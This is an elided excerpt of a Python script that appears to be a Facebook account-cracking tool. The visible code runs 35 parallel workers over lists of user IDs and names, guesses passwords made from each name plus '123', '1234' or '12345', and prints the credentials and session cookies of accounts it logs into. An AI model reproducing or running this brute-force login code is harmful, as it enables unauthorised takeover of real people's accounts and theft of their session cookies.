...
class gas:
    ...
    def crack(self,user,pw):
        ...
        if 'c_user' in d.cookies.get_dict().keys():
            ...
            print(f'\r\x1b[1;32m~ {user}|{pw}|{d.cookies}\x1b[0m\n',end='')
            ...
            print(f'\r\x1b[1;33m~ {user}|{pw}|{ttl}\x1b[0m\n',end='')
    ...
    def get1(self):
        ...
        if(pi in ("y","Y")):
            ...
            with Bool(max_workers=35) as kirim:
                ...
                for email in id:
                    uid,name=email.split('|')
                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345',name.lower()+'1234']
                    elif(len(str(name.lower()))<=2):
                        memek=[name.lower()+'12345',name.lower()+'1234']
                    elif(len(str(name.lower()))<=3):
                        memek=[name.lower()+'123',name.lower()+'12345',name.lower()+'1234']
                    else:
                        memek=[name.lower()+'123',name.lower()+'12345',name.lower()+'1234']
                    try:
        ...
        if(memek in ("y","Y")):
            ...
            with Bool(max_workers=35) as kirim:
                ...
                for email in id:
                    uid,name=email.split('|')
                    if(len(str(name.lower()))>=6):                                 memek=[name.lower(),name.lower()+'123',name.lower()+'12345',name.lower()+'1234']
                    elif(len(str(name.lower()))<=2):                               memek=[name.lower()+'12345',name.lower()+'1234']
                    elif(len(str(name.lower()))<=3):
                        memek=[name.lower()+'123',name.lower()+'12345',name.lower()+'1234']
                    else:
                        memek=[name.lower()+'12345',name.lower()+'1234']
